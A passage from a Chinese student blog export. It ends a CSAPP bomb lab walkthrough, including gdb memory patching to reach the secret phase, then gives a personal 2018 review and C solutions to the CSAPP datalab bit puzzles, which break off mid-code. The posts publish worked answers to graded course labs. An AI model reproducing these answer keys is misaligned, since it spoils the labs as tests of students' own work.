class="line">4011cd:48 89 d1             mov    %rdx,%rcx</span><br><span class="line">4011d0:eb eb                jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line">4011d2:48 c7 42 08 00 00 00 movq   $0x0,0x8(%rdx)</span><br></pre></td></tr></table></figure></p><p>　　最后这一段其实就好理解很多了。其实就是从前往后遍历链表，然后检查下一个结构体元素的value是否大于上一个的，否则爆炸。再看一下前面的内存值。我们就可以得到满足每一个元素value均大于上一个的链表的顺序了：2，1，6，5，4，3。当然要是你信心满满直接把这个顺序输入进去的话（像我一样），你会发现，炸弹还是爆炸了。别忘了，前面有一个操作将a[i]变成了7-a[i]，因此，我们应该再处理一下，得到最终的正确答案为：5，6，1，2，3，4<br>　　Congratulations! You’ve defused the bomb.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">4011da:bd 05 00 00 00       mov    $0x5,%ebp</span><br><span class="line">4011df:48 8b 43 08          mov    0x8(%rbx),%rax</span><br><span class="line">4011e3:8b 00                mov    (%rax),%eax</span><br><span class="line">4011e5:39 03                cmp    %eax,(%rbx)</span><br><span class="line">4011e7:7d 05                jge    4011ee &lt;phase_6+0xfa&gt;</span><br><span class="line">4011e9:e8 4c 02 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">4011ee:48 8b 5b 08          mov    0x8(%rbx),%rbx</span><br><span class="line">4011f2:83 ed 01             sub    $0x1,%ebp</span><br><span class="line">4011f5:75 e8                jne    4011df &lt;phase_6+0xeb&gt;</span><br></pre></td></tr></table></figure></p><h3 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h3><p>　　然而，真的通关了吗？<br>　　细心的同学可能会发现（我也发现啦！），在bomb.c中有着这样一段注释：</p><blockquote><p>/Wow, they got it!  But isn’t something… missing?  Perhaps<br>      something they overlooked?  Mua ha ha ha ha!</p></blockquote><p>　　从这句话，我们可以猜出，作者果然还是有阴谋的。于是我们再重新回去看了一下，发现了一个神奇的函数，叫secret_phase，果然有问题。crtf+f查找，发现这是在phase_defused中调用的，而且再看一下它调用的相关代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">4015d1:48 89 44 24 68       mov    %rax,0x68(%rsp)</span><br><span class="line">4015d6:31 c0                xor    %eax,%eax</span><br><span class="line">4015d8:83 3d 81 21 20 00 06 cmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;</span><br><span class="line">4015df:75 5e                jne    40163f &lt;phase_defused+0x7b&gt;</span><br></pre></td></tr></table></figure></p><p>　　我们发现，只有当前6个炸弹全部拆除后才可以调用。这不明摆着是彩蛋了吗。接下来一大坨代码就是看你能不能顺利揭开彩蛋了。<br>　　接下来，再看下这坨代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">4015e1:4c 8d 44 24 10       lea    0x10(%rsp),%r8</span><br><span class="line">4015e6:48 8d 4c 24 0c       lea    0xc(%rsp),%rcx</span><br><span class="line">4015eb:48 8d 54 24 08       lea    0x8(%rsp),%rdx</span><br><span class="line">4015f0:be 19 26 40 00       mov    $0x402619,%esi</span><br><span class="line">4015f5:bf 70 38 60 00       mov    $0x603870,%edi</span><br><span class="line">4015fa:e8 f1 f5 ff ff       callq  400bf0 &lt;__isoc99_sscanf@plt&gt;   // 读取两个整数和一个字符串</span><br><span class="line">4015ff:83 f8 03             cmp    $0x3,%eax</span><br><span class="line">401602:75 31                jne    401635 &lt;phase_defused+0x71&gt;   // 没有读取到三个，原地爆炸</span><br><span class="line"></span><br><span class="line">401604:be 22 26 40 00       mov    $0x402622,%esi</span><br><span class="line">401609:48 8d 7c 24 10       lea    0x10(%rsp),%rdi</span><br><span class="line">40160e:e8 25 fd ff ff       callq  401338 &lt;strings_not_equal&gt;    // 将读取的字符串与0x402622为首地址的字符串作比较</span><br><span class="line">401613:85 c0                test   %eax,%eax</span><br><span class="line">401615:75 1e                jne    401635 &lt;phase_defused+0x71&gt;  // 字符串和给定的不相同，还是爆炸</span><br></pre></td></tr></table></figure></p><p>　　恩，好吧，从一个给定的串中读取一些东西，打印0x402619后面的几个字符，我们发现结果是“%d %d %s”，读取两个整数和一个字符串。可事情并没有这么简单。我们尝试打印一下0x603870，发现字符串就只有“7 0”，不可能读3个数字。那我们怎么玩？？<br>　　看来我们只好作弊了。使用gdb直接用print指令更改内存的值，将“7 0”后面补一点东西，补什么呢？那当然是0x402622上面的东西了。打印一下，发现是“DrEvil”，好吧满满的恶意。补上之后（可以用类似 p {int}0x603873=’D’ 这样的指令为内存单元赋值），就顺利进入了secret_phase函数了。<br>　　再看一下这个函数干了些什么。恩，读取了一个字符串，再用strtol函数将其转化为数字，也就是说，我们目的就是输入一个满足要求的数字。然后，又与2进行比较，也就是说，我们目的是要运行fun7函数，并且得到答案为2的返回值。<br>　　接下来我们看一下fun7函数。主体大概是这样子的。可以看出，这是一个递归。其中的v为我们输入的那个值。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (x &lt;= v) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * fun7(...);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (x == v) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * fun7(...)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　好了，我们发现代码中有<b>0x8(%rdi),%rdi</b>这样的指令，接下来又要打印内存信息了。注意到一开始传入的值为0x6030f0,故我们打印一下0x6030f8和0x603100的值，发现答案为0x603110和0x603130,又是两个地址。并且，打印0x6030f0,0x603100,0x603110我们发现，结果都是一个比较小的值，不难猜测，这应该是一个二叉树。于是，按照这个规律，我们可以将整棵树打印出来.（其中各个框内表示的是该点的地址）</p><p><table align="center"><tr><td colspan="8">0x6030f0</td></tr><tr><td colspan="4">0x603110</td><td colspan="4">0x603130</td></tr><tr><td colspan="2">0x603190</td><td colspan="2">0x603150</td><td colspan="2">0x603170</td><td colspan="2">0x6031b0</td><br></tr><tr><td>0x6031f0</td><td>0x603250</td><td>0x603270</td><td>0x603230</td><td>0x6031d0</td><td>0x603290</td><td>0x603210</td><td>0x6032b0</td></tr></table><br>　　接着，再倒推，2 = 2 * 1, 1 = 2 * 0 + 1 . 则应该选择地址为0x603150的点，打印得到，答案为22，结束。</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> assembly </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>summary-2018</title>
      <link href="/2019/01/01/summary-2018/"/>
      <url>/2019/01/01/summary-2018/</url>
      
        <content type="html"><![CDATA[<h3 id="2018年的一个小总结："><a href="#2018年的一个小总结：" class="headerlink" title="2018年的一个小总结："></a>2018年的一个小总结：</h3><p>　　首先，其实不知道应该说什么比较好，整个2018年的话，应该还是算过得去吧。不知道该写什么，就还是按照时间的顺序写一下一些对我影响比较大的事情吧。</p><h4 id="年初"><a href="#年初" class="headerlink" title="年初"></a>年初</h4><p>　　记得2018年刚开始的时候，感慨还是挺深的，毕竟处在高三的中期，各个科目也基本都开始了总复习，心情还是略有些紧张的。尽管对很多事情都不确定，但还是硬着头皮往前走，当时基本上就一个目标，把高考考好。那段时间也算是挺努力的了，寒假也没玩什么游戏，基本上花了挺多时间来学习。</p><h4 id="四五月份"><a href="#四五月份" class="headerlink" title="四五月份"></a>四五月份</h4><p>　　这段时间就算是出生以来最难熬的一段时期了。天气十分的炎热，坐在教室里也几乎静不下心来学习。整个人的状态很乱。每天基本上就是刷题，除了题目还是题目，整个人真的十分的疲惫，但也没有任何办法，只能继续坚持下去。也许，那段时间也算是大学之前一段十分快乐的时光吧， 毕竟全班的同学一起向着同一个目标努力，这种机会以后基本上也都不会再有了。</p><h4 id="六月七号-八号"><a href="#六月七号-八号" class="headerlink" title="六月七号 八号"></a>六月七号 八号</h4><p>　　每一年的这两天我想对全国的几百万考生来说都是及其难忘的。即便现在已经过了半年，那个时候自己的状态，心情，甚至在什么时间干了什么事，至今都记忆犹新。还有印象六月七号的那个晚上，下课时分，和另一个同学一起，在教室里谈论着未来。将来会发生什么事呢？考试要是砸了会怎么样呢？恩，基本上整个人都在那样的状态下，坐立不安。</p><p>　　到了六月八号下午，也许那是在那段时间心态最平和的时候了，什么也没说，什么也没想。考完恍若隔世，也是吧，毕竟十几年的读书最终换来的，最主要的也便是那一张写着成绩的白纸罢了。和父母一起，走在学校的街道上，心情说不上好，说不上坏。考完了，理论上来说应该是要比较开心的，可是在这种场合下却也怎么都开心不起来。是的，一个强烈的直觉告诉我：这次考试考得并不好，或者说很差。</p><p>　　接下来的一段时间里，基本上还是尽量让自己不要再去回忆考试的事情了。考得好坏都已经注定，再去想确实也没有任何意义。那段时间和母亲一起去珠海找我哥，又去普宁了一个同学家玩，接下来就是毕业典礼，然后就是揭晓成绩的时刻。</p><h4 id="成绩揭晓"><a href="#成绩揭晓" class="headerlink" title="成绩揭晓"></a>成绩揭晓</h4><p>　　恩，看到成绩出来的那一刻，就像高考完铃声响起的刹那，脑子是空白的，不知该说些什么。然后就是不敢相信自己–我拿到了自己几乎未曾想过的分数，甚至都不敢去再看它一眼。还有印象，那个中午我啥也没吃，就躺在床上发呆，想想自己今后的路该怎么走。是要复读吗？不，绝对不行，我没有勇气去再面对一次高三。就这样吧，差一点就差一点吧，毕竟考试总有人会考得不好的，为什么不能偏偏是我呢？基本上，其实经过了一两天的缓和，也就没有再去想那么多了。尽管现在再次提起还是有些难过的，但也没办法吧。</p><p>　　后面到八月初，就又是一段算是十分快乐的时光了。加入了本地的一个补习社，和几个小伙伴们一起，备课，讲课，每天基本上都是在这样的重复中度过。最多的时候一天能有8节课，常常不得已要利用睡觉的时间来备课。那段时间觉得很累，但是却很舒坦。这里放一张照片纪念一下。<br><img src="/2019/01/01/summary-2018/image.jpg" alt="知新"></p><h4 id="Before-enter-University"><a href="#Before-enter-University" class="headerlink" title="Before enter University"></a>Before enter University</h4><p>　　在忙完了辅导社之后，接下来的时间基本上都是在做一些提前的学习了。毕竟想要在大学考得好，还是需要提前下一番功夫，起码在这一点，要比别人赢在起跑线上，真的不愿意再一次输了。也就是在那段时间，认识了吴晓杰师兄和陈钊燚师兄，也是在他们的帮助下，对大学有了一点了解，也算是更加了解了一下自己究竟想要一些什么。然后就是在不断的学习了。</p><p>　　很奇怪，也许是高考考得不好，也许是因为一些其他什么事情，自从那段时间以来，心里最大的目标就只剩学习（其实还有看番hhh）了。可能是心里那一股不服输的劲吧，以及对自己越来越高的要求，总是不断地告诉自己，必须比别人多付出更多的时间，一定要学得更多，更好。也是从那段时间开始，基本上就已经不再碰任何游戏了，社团也不想参加，变成了一个真真正正的“宅”了。也许这确实有些不好吧。</p><h4 id="Enter-UniqueStudio"><a href="#Enter-UniqueStudio" class="headerlink" title="Enter UniqueStudio"></a>Enter UniqueStudio</h4><p>　　经过了开学以来的努力学习，以及一点运气，最后终于挺过了数轮面试，进入到了联创团队（<a href="https://bbs.hustunique.com/" target="_blank" rel="noopener">uniquestudio</a>）当中。还是很高兴能成为团队的一员的，至少说明了，自己的努力真的还是有回报的。然后再接下来，到年底的时间里面，基本上大部分的课余时间都留给了团队了。平均每周四五十小时以上的学习时间，一周又一周地过去。</p><p>　　刚开始进来的那段时间，也许是最艰难的。很多东西都完全不会，android studio的各种配置什么的问题可以卡好几天。在第一个任务的时候，还啥都不会，所有东西都是边学边做，一个小功能要重复改来改去弄好多遍，往往弄很多遍之后还是不太好，弄到自己也是很烦躁。所以第一个任务做得很差。到了第二个任务的时候，慢慢地开始注意了一些设计模式方面的问题，不会太盲目地想往哪里加功能就往哪里加，不过也是由于经验太少，反复踩了很多坑。好在最后终于算是基本完成了要求了，尽管花的时间比预计的要多一些。基本上对很多东西的了解又加深了一些。</p><p>　　再后面已经接近年末了，第二期任务做完一段时间过后，搭建了自己的第一个博客，也就是这里。也开始尝试这把自己的一些想法记录下来吧。然后也下决心开始看CSAPP这一本书了。说实话，这本书确实很多东西讲得很好（尽管我现在看的还很少），基本上能把我想要知道的东西都讲了，不过语言还是令人很难受的一个坎，毕竟从初中开始英语就不怎么样。好在还有翻译这种神奇的东西，基本上靠半蒙半查加上一点直觉，慢慢地让自己能够静下心来看这本书了，也算是自己的一个进步了吧。</p><p>　　然后就基本上到了年末了，也就是前几天了。慢慢开始减少了一些花在这方面的时间了，稍微把时间分配给了一下课内的一些知识，毕竟说到底，到现在我都没办法确定自己究竟想要读研究生还是直接出来工作，毕竟大一上学期还是不要太早下论断的好吧。还是得看一下这学期末的成绩吧，如果能够考得比较好，将来有希望能保研去清北复交或者浙大中科大之类的，那还是有可能争取一下的。这个寒假应该就需要结合自己的成绩想清楚了吧。</p><h4 id="expection"><a href="#expection" class="headerlink" title="expection"></a>expection</h4><p>　　其实感觉这东西很说不准。毕竟现在真的还没办法未来要做什么。但近期的一些flag还是可以立一下的。尽量在寒假把CSAPP多看一点吧，最好能看完70%以上吧，以及最好多做几个实验，也算是巩固一下自己看书学到的一些知识。然后下学期开始后尽量快点把这本书看完，接着花几个星期的时间把开发艺术探索，源码设计模式等补了，有时间的话看一下争取在大一下学期结束之前把计网和现代操作系统看了吧。基本上大一能把这几本书看完就已经很不错了。</p><p>　　然后如果将来要走偏图形这一块的话，那可能需要稍微为这方面做一点准备了。以及线代一定要学好。如果将来选择争取保研的话，那可能要找一些数学方面的更深入的书籍学习一下，物理可能也需要花一些时间。毕竟理工科无论如何这两个科目一定不能差吧。</p><p>　　然后如果将来选择放弃保研，毕业后就直接出来工作的话，那可能会在大一的暑假看一下linux内核的一些东西或者是Android底层的源码，起码要比现在再深入一些吧。</p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>　　最后还是再罗嗦一下吧。总的来说，2018年对我自己来说确实可以称得上是转折性的一年。这一年里发生了太多值得我去回忆的事情。我也很庆幸，自己能够变成现在这个样子，尽管它未必很好。很开心，现在身边能有很多优秀的同学值得我去学习，未来的路子还长，还需要一步一个脚印继续慢慢往前走去。<br>　　结尾还是要放点啥，就留下我特别喜欢的一段话吧：</p><blockquote><p>人の人生は、自分の墓へ走る汽车に乗っているようだ。途中は沢山駅があるけど、ずっと最後まで侧にいってくれる人はいない。だから、いってくれた人が降りる前に、いくらさびしくても、感谢の気持ちでさよならと言おう。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> summary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>csapp-Datalab</title>
      <link href="/2018/12/25/csapp-Datalab/"/>
      <url>/2018/12/25/csapp-Datalab/</url>
      
        <content type="html"><![CDATA[<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>　　这是csapp系列的第一篇文章。本文主要讲一下关于 <a href="http://csapp.cs.cmu.edu/3e/README-datalab" target="_blank" rel="noopener"><strong>datalab [Updated 11/2/18]</strong></a> 的解决方法以及简单的思路。如果有哪里写的不清楚或者有问题，欢迎联系我修改(右下角小图标点开即可对话)。<br>  注：其中某些题目应该有更优的解法。以下仅供参考</p><h3 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h3><p>题意：用 ~ 和 &amp; 运算符实现 Xor 运算符<br>思路：我们知道Xor运算符是对每一个位，相同的话返回0，不同的话返回1。题目中仅有 &amp; 是双目运算符，那么我们可以采用 &amp; 运算符获得均为1的位，再取反，同理，用 &amp; 和 ~ 获得均为 0 的位，再取反，最后两者再进行 &amp; ，即可得到答案。<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~(x&amp;y)&amp;~(~x&amp;~y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h3><p>题意：让你输出反码下的最小值<br>思路：水题。。直接由定义得。<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h3><p>题意：判断一个数是否为反码下的最大值<br>思路：若x为Tmax，x+1取反之后应该等于x。故可以采用取反与原数Xor的思路。但要注意，<strong>0xffffffff</strong>也满足该性质，需要排除。<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> !(~(x+<span class="number">1</span>)^x)&amp;!(!(~x));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h3><p>题意：判断一个数是否所有的奇数位都为1。(位的序号从0到32)<br>思路：我们知道，若奇数位为均为1，则右移一位后偶数位均为1，两者相与的话为<strong>0xffffffff</strong>。利用该性质可得到答案。不过要注意，偶数位上的1会影响我们的判断，故需要利用掩码将其过滤。(0xA = 1010)<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">x = x &amp; <span class="number">0xAAAAAAAA</span>;</span><br><span class="line"><span class="keyword">return</span> !(~(x|(x&gt;&gt;<span class="number">1</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h3><p>题意：求一个数的相反数。<br>思路：水题，由常用结论我们知道，-x = ~x + 1<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="isAsciiDight"><a href="#isAsciiDight" class="headerlink" title="isAsciiDight"></a>isAsciiDight</h3><p>题意：判断一个数字是否在(0x30和0x39)之间<br>思路：这道题我想不出比较好的解法。只能暴力判断。即先看2进制下的前26六位是否有值，然后在看下后6位。x+6仍然小于0x40，则x小于0x3。.再看下剩下六位中前两位是否均为1，是的话x大于0x30。<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> t = x &amp; <span class="number">0xFFFFFFC0</span>;</span><br><span class="line">x = x &amp; <span class="number">0x3F</span>;</span><br><span class="line"><span class="keyword">return</span> !t&amp;!((x+<span class="number">6</span>)&amp;<span class="number">0x40</span>)&amp;(x&gt;&gt;<span class="number">4</span>)&amp;(x&gt;&gt;<span class="number">5</span>)&amp;<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h3><p>题意：实现三目运算符 ？：<br>思路：先用！判断是否为x是否为真。然后在利用与的性质：一个数和<strong>0xffffffff</strong>相与结果为其本身，和<strong>0</strong>相与结果为0。<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">x = !x;</span><br><span class="line"><span class="keyword">return</span> y&amp;(~(!x)+<span class="number">1</span>) | z&amp;(~x+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><p>题意：判断x是否小于等于y<br>思路：x&lt;=y 则 y - x &gt;= 0。分别取出x和y的符号，进行判断。若y大于0，x小于0，则显然为真。若y小于0，x大于0，则显然为假。剩下的异号的情况则用y + (-x) 判断即可。<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> sgnx = (x&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> sgny = (y&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> !sgny &amp; sgnx | !(sgnx^sgny) &amp; !((y + (~x+<span class="number">1</span>))&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h3><p>题意：使用其他的逻辑运算符和位运算符实现 ！运算符<br>思路：我们知道，一个数的相反数等于其本身的数只有0(注意：<strong>~0x80000000 + 1 = 0x80000000</strong>)<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ((~x+<span class="number">1</span> | x)&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h3><p>题意：给一个数字x,求出要表示出x需要的最少的位数。<br>思路：个人觉得，本题难度很大。以下的思路可能并不算很好，不过还是可以通过的。<br>　　首先，我们知道，对于一个n位的二进制数，能表示的数字的范围为 -2<sup>n</sup> ~ 2<sup>n</sup> - 1。故对于输入的整数x，我们可以先将其变成正数，即下方的_mask。现在就只需考虑正数。题目转化为求最高位的1。但最高位的1不是很好求，我们可以将其转化为求二进制下x含有多少个1。<br>　　假设当前最高位的1位于第5位，右移并按位或后，第五位，第四位均为1，再向右移两位并且按位或，第二、三、四、五位均为1，以此类推，我们将最高位的1后的所有位全部变成了1。(假设原数为0x0A0BA973，经过处理之后就会变成0x0FFFFFFF)。<br>　　接下来考虑如何求出所有位上1的总数。我们可以考虑使用分段的办法。考虑以下的32位二进制数,我们将其分成四个部分：<br>　　00000010 | 00100111 | 11010010 | 00110001<br>接下来我们采用掩码分别将其各个部分的1的总数做一个累加，掩码应为：<br>　　00000001 | 00000001 | 00000001 | 00000001<br>即对每一个部分，掩码的值都是1。接下来用&amp;运算符获得最低位的数字，四个部分分别为0,1,0,1. 然后，再将x右移一位，再继续进行&amp;运算，以此类推，最后得到四个部分的值分别为：1,4,4,3。即最后得到的sum为：<br>　　00000001 | 00000100 | 00000100 | 00000011<br>最后再利用掩码0xff(11111111)，分别得到各个部分的值，做一个累加，得到答案(别忘记+1)。<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"> <span class="keyword">int</span> _mask = (x&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>))&gt;&gt;<span class="number">31</span>;</span><br><span class="line">x = x^_mask;</span><br><span class="line">x |= x&gt;&gt;<span class="number">1</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">2</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">4</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">8</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">16</span>;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>, mask = <span class="number">0x1</span> | <span class="number">0x100</span> | <span class="number">0x10000</span> | <span class="number">0x1000000</span>;</span><br><span class="line">sum += x &amp; mask;</span><br><span class="line">sum += (x&gt;&gt;<span class="number">1</span>) &amp;mask;</span><br><span class="line">sum += (x&gt;&gt;<span class="number">2</span>) &amp;mask;</span><br><span class="line">sum += (x&gt;&gt;<span class="number">3</span>) &amp;mask;</span><br><span class="line">sum += (x&gt;&gt;<span class="number">4</span>) &amp;mask;</span><br><span class="line">sum += (x&gt;&gt;<span class="number">5</span>) &amp;mask;</span><br><span class="line">sum += (x&gt;&gt;<span class="number">6</span>) &amp;mask;</span><br><span class="line">sum += (x&gt;&gt;<span class="number">7</span>) &amp;mask;</span><br><span class="line"><span class="keyword">return</span> (sum&amp;<span class="number">0xff</span>) + ((sum&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>) + ((sum&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>) + ((sum&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h3><p>题意：本题给一个无符号数，让你把它看成一个浮点数(都是32位)，让你输出x * 2 的值<br>思路：比较简单，按照浮点数1,8,23的分布将符号，指数，尾数分别取出，并分类讨论即可。<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> frac = uf&amp;<span class="number">0x007fffff</span>;</span><br><span class="line">uf&gt;&gt;=<span class="number">23</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="built_in">exp</span> = uf&amp;<span class="number">0xff</span>;</span><br><span class="line">uf&gt;&gt;=<span class="number">8</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">exp</span>) &#123;</span><br><span class="line">frac &lt;&lt;= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> t = frac&gt;&gt;<span class="number">23</span>;</span><br><span class="line"><span class="keyword">if</span> (t) &#123;</span><br><span class="line">frac = frac &amp; <span class="number">0x007fffff</span>;</span><br><span class="line"><span class="built_in">exp</span>++;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">exp</span> != <span class="number">0xff</span>)  <span class="built_in">exp</span>++;</span><br><span class="line"><span class="keyword">return</span> (uf&lt;&lt;<span class="number">31</span>) + (<span 